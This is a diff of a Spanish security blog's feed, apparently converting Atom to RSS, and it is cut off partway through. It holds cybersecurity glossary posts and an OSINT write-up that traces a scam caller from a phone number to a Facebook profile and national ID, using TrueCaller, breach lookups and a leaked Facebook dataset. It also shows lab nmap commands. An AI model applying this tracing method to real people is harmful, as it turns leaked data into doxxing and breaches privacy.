@@ -1,252 +1,1271 @@
-
-
-<feed xmlns="http://www.w3.org/2005/Atom">
-  <id>/</id>
-  <title>T3sla</title>
-  <subtitle>T3sla Blog, Cybersecurity enthusiast, Low-level enthusiast.</subtitle>
-  <updated>2022-10-20T03:33:09-03:00</updated>
-  <author>
-    <name>T3sla</name>
-    <uri>/</uri>
-  </author>
-  <link rel="self" type="application/atom+xml" href="/feed.xml"/>
-  <link rel="alternate" type="text/html" hreflang="en"
-    href="/"/>
-  <generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator>
-  <rights> © 2022 T3sla </rights>
-  <icon>/assets/img/favicons/favicon.ico</icon>
-  <logo>/assets/img/favicons/favicon-96x96.png</logo>
-
-
-  
-  <entry>
-    <title>¿Quién será?</title>
-    <link href="/posts/qui%C3%A9n-ser%C3%A1/" rel="alternate" type="text/html" title="¿Quién será?" />
-    <published>2022-10-19T15:14:00-03:00</published>
-  
-    <updated>2022-10-19T15:14:00-03:00</updated>
-  
-    <id>/posts/qui%C3%A9n-ser%C3%A1/</id>
-    <content src="/posts/qui%C3%A9n-ser%C3%A1/" />
-    <author>
-      <name>T3sla</name>
-    </author>
-
-  
-    
-    <category term="Tutorial" />
-    
-  
-
-  
-    <summary>
-      
-
-
-
-
-
-      Bienvenidos, el artículo de hoy trata de como “descubrí a la persona que estaba detrás de un número”.
-Más que nada, una especie de writeup sobre investigar un número de teléfono, herramientas y tal, -quizás les sea útil y puedan aprender algo nuevo.
-
-
-
-
-Contexto
-El otro día estaba tranquilo viendo unos videos en TikTok y de la nada recibo una llamada entrante de un número desconocido, lo cual p...
-    </summary>
-  
-
-  </entry>
-
-  
-  <entry>
-    <title>Términos Ciberseguridad (PT. 2)</title>
-    <link href="/posts/t%C3%A9rminos-ciberseguridad-2/" rel="alternate" type="text/html" title="Términos Ciberseguridad (PT. 2)" />
-    <published>2022-09-23T20:12:00-03:00</published>
-  
-    <updated>2022-09-23T20:12:00-03:00</updated>
-  
-    <id>/posts/t%C3%A9rminos-ciberseguridad-2/</id>
-    <content src="/posts/t%C3%A9rminos-ciberseguridad-2/" />
-    <author>
-      <name>T3sla</name>
-    </author>
-
-  
-    
-    <category term="Ciberseguridad" />
-    
-  
-
-  
-    <summary>
-      
-
-
-
-
-
-      Bienvenidos a la segunda parte de términos que se utilizan en InfoSec.
-Debido al gran apoyo y buenos comentarios que recibí de parte de varias personas, adelante este artículo. 😊 
-Empecemos.
-
-
-1. IPS
-Sistema de prevención de intrusos.
-
-  Es una «solución de seguridad» como su nombre indica, que previene algún tipo de intrusión proveniente de algún actor de amenaza, ya sea en un equipo o red.
-
-
-...
-    </summary>
-  
-
-  </entry>
-
-  
-  <entry>
-    <title>Términos Ciberseguridad</title>
-    <link href="/posts/terminosciberseguridad/" rel="alternate" type="text/html" title="Términos Ciberseguridad" />
-    <published>2022-09-19T21:16:00-03:00</published>
-  
-    <updated>2022-09-19T21:16:00-03:00</updated>
-  
-    <id>/posts/terminosciberseguridad/</id>
-    <content src="/posts/terminosciberseguridad/" />
-    <author>
-      <name>T3sla</name>
-    </author>
-
-  
-    
-    <category term="Ciberseguridad" />
-    
-  
-
-  
-    <summary>
-      
-
-
-
-
-
-      Bienvenidos, el artículo de hoy tratará sobre términos utilizados en InfoSec.
-Más bien es una recopilación de términos/conceptos, entre otros.
-Pues si, alguna vez escuchaste o leíste alguna palabra y no tenías idea de lo que significaba este artículo, es perfecto para ti. 😉
-La idea de esto es como tener un diccionario, simplemente tener un lugar donde almacenar todos los términos/conceptos/pala...
-    </summary>
-  
-
-  </entry>
-
-  
-  <entry>
-    <title>RouterSpace HackTheBox</title>
-    <link href="/posts/routerspace-hackthebox/" rel="alternate" type="text/html" title="RouterSpace HackTheBox" />
-    <published>2022-06-27T00:04:00-04:00</published>
-  
-    <updated>2022-06-27T00:04:00-04:00</updated>
-  
-    <id>/posts/routerspace-hackthebox/</id>
-    <content src="/posts/routerspace-hackthebox/" />
-    <author>
-      <name>T3sla</name>
-    </author>
-
-  
-    
-    <category term="HTB" />
-    
-  
-
-  
-    <summary>
-      
-
-
-
-
-
-      Bienvenidos
-Este artículo tratará la resolución de la máquina RouterSpace de HackTheBox.
-
-
-Información sobre la máquina
-
-Matrix
-
-
-  APK
-  IPv6
-  SSH
-  Authorized Keys
-  Key-Gen
-  API
-  Proxy
-  RCE
-
-
-
-Reconocimiento
-Nmap (TCP)
-nmap -sS -p- --open -n -v -T5 -Pn 10.10.11.148
-nmap -sS -p 80,22 -n -Pn -T5 -sCV 10.10.11.148 -o content/nmap
-
-
-
-Nmap no logra obtener ninguna versión de los servicios exp...
-    </summary>
-  
-
-  </entry>
-
-  
-  <entry>
-    <title>Pandora HackTheBox</title>
-    <link href="/posts/pandora-hackthebox/" rel="alternate" type="text/html" title="Pandora HackTheBox" />
-    <published>2022-05-18T19:51:00-04:00</published>
-  
-    <updated>2022-05-18T19:51:00-04:00</updated>
-  
-    <id>/posts/pandora-hackthebox/</id>
-    <content src="/posts/pandora-hackthebox/" />
-    <author>
-      <name>T3sla</name>
-    </author>
-
-  
-    
-    <category term="HTB" />
-    
-  
-
-  
-    <summary>
-      
-
-
-
-
-
-      Bienvenidos/a
-Este artículo tratará la resolución de la máquina Pandora de la plataforma de Ciberseguridad HackTheBox.
-
-
-Información sobre la máquina
-
-Bueno, esta máquina tiene una dificultad fácil, pero digo desde ya que no es una máquina fácil, ja, ja. Muy divertida y aprendí bastantes cosas en su momento. Sin duda mi máquina favorita &amp;lt;3.
-Matrix
-
-
-  SQLI (Sql Injection)
-  SNMP (Protocolo s...
-    </summary>
-  
-
-  </entry>
-
-</feed>
-
-
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>T3sla</title>
+        <description>T3sla Blog, Cybersecurity enthusiast, Low-level enthusiast.</description>
+        <link>/</link>
+        <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
+        <pubDate>Sat, 05 Nov 2022 04:46:13 -0300</pubDate>
+        <lastBuildDate>Sat, 05 Nov 2022 04:46:13 -0300</lastBuildDate>
+        <generator>Jekyll v4.2.1</generator>
+        
+            <item>
+                <title>¿Quién será?</title>
+                <description>&lt;p&gt;Bienvenidos, el artículo de hoy trata de como &lt;strong&gt;“descubrí a la persona que estaba detrás de un número”&lt;/strong&gt;.&lt;br /&gt;
+Más que nada, una especie de &lt;strong&gt;writeup&lt;/strong&gt; sobre &lt;strong&gt;investigar&lt;/strong&gt; un número de teléfono, herramientas y tal, &lt;br /&gt;
+quizás les sea útil y puedan aprender algo nuevo.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quiensera/OSINT.png&quot; alt=&quot;OSINT&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;contexto&quot;&gt;Contexto&lt;/h2&gt;
+&lt;p&gt;El otro día estaba tranquilo viendo unos videos en &lt;a href=&quot;https://tiktok.com/&quot;&gt;TikTok&lt;/a&gt; y de la nada &lt;strong&gt;recibo&lt;/strong&gt; una &lt;strong&gt;llamada&lt;/strong&gt; entrante de un &lt;strong&gt;número desconocido&lt;/strong&gt;, lo cual procedo a contestar.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Todo bien, en ese momento, habla una mujer &lt;strong&gt;preguntando&lt;/strong&gt; por “Alfredo”; respondo diciendo equivocada y corto.
+A los &lt;strong&gt;5 - 10 segundos&lt;/strong&gt; de haber finalizado la llamada &lt;strong&gt;vuelve&lt;/strong&gt; a llamar &lt;strong&gt;comunicándome&lt;/strong&gt; lo siguiente &lt;strong&gt;«que es mi vecina del condominio llamándome por ruidos molestos y debo pagar una multa a la siguiente cuenta»&lt;/strong&gt; (pienso en mi cabeza ¿y está de que va?).&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Respondo lo siguiente &lt;strong&gt;«Oh, qué buena broma, pero no cuela, adiós»&lt;/strong&gt;, dice algo, pero no recuerdo qué, luego de eso no llamo más (algo así fue de igual manera, estoy omitiendo ciertos datos).
+&lt;br /&gt;Luego paso el tiempo y dije, “investigaré el número a ver qué logro encontrar”.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-agregar-a-contactos&quot;&gt;1. Agregar a contactos.&lt;/h2&gt;
+&lt;p&gt;Agregamos a contactos con el fin de descubrir si tiene una cuenta de WhatsApp y así poder visualizar su foto de perfil.&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/quiensera/contacto.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Es el caso, pero no tiene foto (seguramente ajustes de privacidad).&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;2-obtener-más-información&quot;&gt;2. Obtener más información&lt;/h2&gt;
+&lt;p&gt;Usamos &lt;a href=&quot;https://truecaller.com/&quot;&gt;TrueCaller&lt;/a&gt; y así recopilar más información como la compañía, nombre del propietario del número, entre otras cositas.&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/quiensera/truecaller.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Consigo nombre, apellido, compañía y e-mail.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;3-e-mail-filtrado&quot;&gt;3. E-mail filtrado.&lt;/h2&gt;
+&lt;p&gt;Como obtuve el e-mail a través de TrueCaller procedo a realizar una búsqueda en &lt;a href=&quot;https://haveibeenpwned.com/&quot;&gt;haveibeenpwned&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quiensera/pwned.png&quot; alt=&quot;haveibeenpwned&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Genial está filtrado el e-mail, podría buscar la DB del leak y así obtener alguna credencial, pero no es el caso.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;4-número-fb&quot;&gt;4. Número FB&lt;/h2&gt;
+&lt;p&gt;Quise saber si el número estaba vinculado a una cuenta de Facebook.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quiensera/fb.png&quot; alt=&quot;fb&quot; /&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/quiensera/fb2.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Genial.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;5-fb-leak&quot;&gt;5. FB-Leak&lt;/h2&gt;
+&lt;p&gt;Lo otro que hice fue buscar el número en un leak de Facebook que corresponde al año 2019 si no estoy mal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quiensera/fbleak.png&quot; alt=&quot;fbleak&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obtenemos el identificador del perfil.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;6-fb-id&quot;&gt;6. FB ID&lt;/h2&gt;
+&lt;p&gt;A través de esta URL y modificando el valor del parámetro “id” asignamos el ID obtenido a anteriormente.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;facebook.com/profile.php?id=ID
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/quiensera/urlid.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/quiensera/fbprofile.png&quot; alt=&quot;fbprofile&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo, podemos visualizar el perfil sin ningún problema.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;7-rutificador&quot;&gt;7. Rutificador&lt;/h2&gt;
+&lt;p&gt;Con los datos recopilados podemos hacer uso del rutificador y así obtener el RUT (DNI).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quiensera/rutificador.png&quot; alt=&quot;rutificador&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vale teniendo esto, podemos hacer muchas cosas.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Nos damos cuenta lo &lt;strong&gt;relativamente&lt;/strong&gt; fácil que es &lt;strong&gt;obtener&lt;/strong&gt; información de &lt;strong&gt;alguien&lt;/strong&gt; con solo el &lt;strong&gt;número&lt;/strong&gt; y la &lt;strong&gt;mala&lt;/strong&gt; “protección” de datos que existe en &lt;strong&gt;Chile&lt;/strong&gt; por parte de terceros, como las &lt;strong&gt;compañías&lt;/strong&gt; de teléfono.&lt;br /&gt;
+Agregar que nunca hay que confiarse de la información dada por TrueCaller y otros, ya que nunca es 100% precisa y esta depende de múltiples factores.&lt;/p&gt;
+
+&lt;p&gt;¿Cómo sabes que realmente los datos que recopilaste pertenecen a la persona que te llamo?&lt;br /&gt;
+Lo sé con seguridad porque los datos recopilados concuerdan al 100% con los datos dados por la mujer (como nombre, apellido y nombre del condominio) que me llamo e incluso la voz coincide.&lt;/p&gt;
+
+&lt;p&gt;Espero te haya gustado, recuerda que más abajo están las reacciones y puedes dejar un comentario.
+&lt;br /&gt;También puedes comunicarte a través de las siguientes vías; &lt;a href=&quot;https://twitter.com/T3_6_9/&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9/&quot;&gt;Telegram&lt;/a&gt;, &lt;a href=&quot;mailto:t3sla@t3sla.tk&quot;&gt;E-mail&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Agregar que si quieres realizar alguna donación lo puedes hacer a través del siguiente botón:
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtén “beneficios”.&lt;/p&gt;
+
+</description>
+                <pubDate>Sat, 05 Nov 2022 02:34:00 -0300</pubDate>
+                <link>/qui%C3%A9n-ser%C3%A1</link>
+                <guid isPermaLink="true">/qui%C3%A9n-ser%C3%A1</guid>
+                
+                <category>Writeup</category>
+                
+                <category>OSINT</category>
+                
+                <category>T3sla</category>
+                
+                <category>2022</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>Términos Ciberseguridad (PT. 2)</title>
+                <description>&lt;p&gt;Bienvenidos a la segunda parte de términos de ciberseguridad, debido al apoyo y mensajes por privado que recibí, he adelantado la segunda parte.&lt;/p&gt;
+
+&lt;p&gt;Recordad que la idea de estos artículos es cumplir la función de un diccionario/glosario, por si alguna vez se te olvida alguna definición puedas acudir a estas entradas. (;&lt;/p&gt;
+
+&lt;p&gt;Sin más que agregar, comencemos.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-ips&quot;&gt;1. IPS&lt;/h2&gt;
+&lt;p&gt;Sistema de prevención de intrusos.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Es una «solución de seguridad» como su nombre indica, que previene algún tipo de intrusión proveniente de algún actor de amenaza, ya sea en un equipo o red.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.paloaltonetworks.com/cyberpedia/what-is-an-intrusion-prevention-system-ips&quot;&gt;IPS-Paloalto&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Sistema_de_prevenci%C3%B3n_de_intrusos&quot;&gt;IPS-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;2-noc&quot;&gt;2. NOC&lt;/h2&gt;
+&lt;p&gt;Centro de Operaciones de Red.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Es similar al SOC, pero la diferencia es que el NOC se dedica a “resolver/solucionar” incidentes que ocurran con la red, como fallas, entre otras (disponibilidad), y no desde el ámbito como tal de la seguridad como lo hace el SOC.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.internationalit.com/post/noc-vs-soc-cual-es-la-diferencia-entre-ambos?lang=es&quot;&gt;NOC-internationalIT&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-soc/noc-vs-soc-whats-the-difference/&quot;&gt;NOC-CheckPoint&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;3-dos&quot;&gt;3. DoS&lt;/h2&gt;
+&lt;p&gt;Ataque de denegación de servicio.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Es un ataque que tiene como fin afectar a un sistema o equipo con el propósito de provocar su caída o inhabilitar el acceso a un “servicio” que corran en dichos sistemas o equipos.
+Generalmente, el ataque proviene de un equipo, también agregar que los actores de amenaza
+los suelen utilizar como «cortinas de humo».&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/&quot;&gt;DoS-CloudFlare&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.paloaltonetworks.com/cyberpedia/what-is-a-denial-of-service-attack-dos&quot;&gt;DoS-Paloalto&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;4-ddos&quot;&gt;4. DDoS&lt;/h2&gt;
+&lt;p&gt;Ataque de denegación de servicio distribuido.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Tiene el mismo fin que el ataque DoS, pero la diferencia es que este ataque suele venir de muchos equipos y la mayoría de ataques de este tipo suelen ser contra servidores web.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cloudflare.com/es-es/learning/ddos/what-is-a-ddos-attack/&quot;&gt;DDoS-CloudFlare&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.akamai.com/es/our-thinking/ddos&quot;&gt;DDoS-Akamai&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;5-apt&quot;&gt;5. APT&lt;/h2&gt;
+&lt;p&gt;Amenaza persistente avanzada.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Generalmente, son grupos de «cibercriminales» que realizan ataques muy sofisticados y se conoce de varios grupos APTs que son “apoyados” por distintos gobiernos.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.crowdstrike.com/cybersecurity-101/advanced-persistent-threat-apt/&quot;&gt;APT-Crowdstrike&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.kaspersky.com/resource-center/definitions/advanced-persistent-threats&quot;&gt;APT-Kapersky&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Amenaza_persistente_avanzada&quot;&gt;APT-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;6-c2&quot;&gt;6. C2&lt;/h2&gt;
+&lt;p&gt;Comando y control.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Como su nombre indica, está «dividido» en las siguientes fases, la del comando y control (agregar, que también es conocido por las siglas CnC), la cual un actor de amenaza puede gestionar diferentes equipos que previamente haya comprometido a través de un malware enviando comandos, cargas útiles (Payloads), entre otros y recibiendo información sobre dicho equipo comprometido.
+Es bastante utilizado por grupos APTs y una de las herramientas más utilizadas para esto es &lt;a href=&quot;https://www.cobaltstrike.com/&quot;&gt;Cobalt Strike&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.paloaltonetworks.com/cyberpedia/command-and-control-explained&quot;&gt;C2-paloalto&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Mando_y_control_(malware)&quot;&gt;C2-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;7-zero-click&quot;&gt;7. Zero Click&lt;/h2&gt;
+&lt;p&gt;Zero clic.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Son exploits que no requieren de algún tipo de interacción con en el usuario (como hacer clic en un enlace o algo parecido) y no tiene alguna «solución/parche» hasta el momento, ya que son desconocidos.
+Agregar que se volvieron más “famosos” (conocidos el nombre en sí) gracias al “Spyware Pegasus” porque uno de los vectores que utilizaba para “comprometer” dispositivos móviles eran y son de este tipo.
+Ejemplo: Te envían una imagen a través de alguna aplicación de mensajería como &lt;a href=&quot;https://telegram.org/&quot;&gt;Telegram&lt;/a&gt; y tu dispositivo ya está comprometido.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.kaspersky.es/resource-center/definitions/what-is-zero-click-malware&quot;&gt;ZeroClick-Kapersky&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;WikipediA
+&lt;img src=&quot;/images/terminosciber2/zeroclick.png&quot; alt=&quot;zeroclick wikipedia&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;8-backdoor&quot;&gt;8. Backdoor&lt;/h2&gt;
+&lt;p&gt;Puerta trasera.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Es una técnica que se suele emplear al momento de dejar algún tipo de persistencia/acceso en un equipo comprometido con el fin de acceder sin tener que “volver” a realizar la explotación de alguna «vulnerabilidad», pero no necesariamente tiene que ser siempre un fin malicioso, sino que desarrolladores pueden dejar una puerta trasera (Backdoor) en su software con el propósito de tener un acceso oculto/secreto.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo el siguiente enlace;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Puerta_trasera&quot;&gt;Backdoor-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;9-exploit&quot;&gt;9. Exploit&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Generalmente, es una pieza/trozo de código que está desarrollado con el fin de explotar una vulnerabilidad de un software y así “modificar” el flujo del programa, es decir, realizar/provocar algún tipo de acción/evento que no estaba previsto.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.welivesecurity.com/la-es/2014/10/09/exploits-que-son-como-funcionan/&quot;&gt;Exploit-welivesecurity&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.kaspersky.es/blog/exploits-problem-explanation/6520/&quot;&gt;Exploit-Kapersky&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Exploit&quot;&gt;Exploit-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;10-hijacking&quot;&gt;10. Hijacking&lt;/h2&gt;
+&lt;p&gt;Secuestro.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Hace relación a toda actividad/acción que realicé un actor de amenaza con el propósito de adueñarse de un “activo”, estos pueden ser una cuenta de alguna Red Social, Cookie, entre otros.
+    Ejemplos de vectores de ataque que emplean esta técnica: 
+&lt;br /&gt; Session Hijacking, DNS Hijacking. &lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Hijacking&quot;&gt;Hijacking-WikipediA&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-pdf-archive/Sessi%C3%B3n_Hijacking_Peligro_en_la_Red.pdf&quot;&gt;Session_Hijacking-Owasp&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Espero te haya gustado, recuerda que más abajo están las reacciones y puedes dejar un comentario.
+&lt;br /&gt;También puedes comunicarte a través de las siguientes vías; &lt;a href=&quot;https://twitter.com/T3_6_9/&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9/&quot;&gt;Telegram&lt;/a&gt;, &lt;a href=&quot;mailto:t3sla@t3sla.tk&quot;&gt;E-mail&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Trate de poner las fuentes más confiables para los enlaces (Wikipedia es un caso aparte) y al momento de dar ejemplos o definición intente dar una respuesta bajo mis conocimientos y así no es un copia y pega.&lt;/p&gt;
+
+&lt;p&gt;Agregar que si quieres realizar alguna donación lo puedes hacer a través del siguiente botón:
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtén “beneficios”.&lt;/p&gt;
+</description>
+                <pubDate>Fri, 04 Nov 2022 19:52:00 -0300</pubDate>
+                <link>/t%C3%A9rminos-ciberseguridad-pt-2</link>
+                <guid isPermaLink="true">/t%C3%A9rminos-ciberseguridad-pt-2</guid>
+                
+                <category>Ciberseguridad</category>
+                
+                <category>T3sla</category>
+                
+                <category>2022</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>Términos Ciberseguridad</title>
+                <description>&lt;p&gt;Bienvenidos, el artículo de hoy tratará sobre los términos que se suelen utilizar en ciberseguridad.&lt;/p&gt;
+
+&lt;p&gt;Si alguna vez escuchaste o leíste alguna palabra y no tenías idea de lo que significaba como “AV” este artículo es perfecto para ti. 😃&lt;/p&gt;
+
+&lt;p&gt;Lo más probable es que haga una serie de esto, por lo cual tendrán varias entradas y la idea de esto es tener un diccionario/glosario al cual acudir si alguna vez no recuerdas alguna palabra.&lt;/p&gt;
+
+&lt;p&gt;Sin más que agregar, comencemos.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-ioc&quot;&gt;1. IoC&lt;/h2&gt;
+&lt;p&gt;Indicador de compromiso.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Imagina que un investigador de seguridad encontró un software malicioso que está infectando diferentes equipos, entonces lo que hace el investigador de seguridad es compartir los indicadores de compromiso (IoCs) que serian los nombres de archivo, el hash que identifica al archivo, ya sea SHA-256, MD5, etc. En simples palabras, eso sería o sirve como un indicador de compromiso.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
